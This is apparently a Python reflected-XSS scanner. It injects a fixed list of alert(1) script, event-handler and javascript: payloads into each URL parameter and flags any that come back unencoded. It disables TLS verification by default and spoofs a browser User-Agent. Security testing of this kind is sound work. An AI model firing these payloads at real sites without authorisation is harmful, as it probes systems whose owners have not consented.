"""
Reflected XSS scanner module.

Injects a set of XSS payloads into each URL parameter and checks whether
the unencoded payload is reflected in the response body.
"""

from __future__ import annotations

import json
from argparse import ArgumentParser
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode

import requests


PAYLOADS: tuple[str, ...] = (
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'\"><img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
)


class XSSScanner:
    """
    Reflected XSS scanner.

    Example:
        x = XSSScanner("http://target/search?q=test")
        print(x.scan())
    """

    def __init__(self, url: str, timeout: float = 8.0, verify_ssl: bool = False) -> None:
        self.url = url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0 Safari/537.36"
            )
        })
        self.session.verify = verify_ssl

    def _test(self, param: str, payload: str) -> tuple[str, str]:
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        r = self.session.get(test_url, timeout=self.timeout)
        return test_url, r.text

    def scan(self) -> list[dict[str, Any]]:
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        if not params:
            return [{"error": "no query parameters in URL"}]

        findings: list[dict[str, Any]] = []
        for param in params:
            for payload in PAYLOADS:
                try:
                    test_url, body = self._test(param, payload)
                except Exception:
                    continue
                if payload in body:
                    finding = {
                        "param": param,
                        "payload": payload,
                        "url": test_url,
                        "reflected": True,
                    }
                    findings.append(finding)
                    print(f"[!] XSS on '{param}' :: {payload}")
                    break
        return findings

    def pretty(self, findings: list[dict[str, Any]]) -> str:
        bar = "=" * 56
        lines = [bar, f"  XSS Scan :: {self.url}",
                 f"  Hits: {len(findings)}", bar]
        for f in findings:
            if "error" in f:
                lines.append("  " + f["error"])
                continue
            lines.append(f"  param={f['param']}")
            lines.append(f"      payload: {f['payload']}")
        return "\n".join(lines)


def main() -> None:
    p = ArgumentParser(description="Reflected XSS scanner")
    p.add_argument("url", help="target URL with query string")
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--json", action="store_true")
    args = p.parse_args()

    x = XSSScanner(args.url, timeout=args.timeout)
    findings = x.scan()

    if args.json:
        print(json.dumps(findings, indent=2))
    else:
        print(x.pretty(findings))


if __name__ == "__main__":
    main()
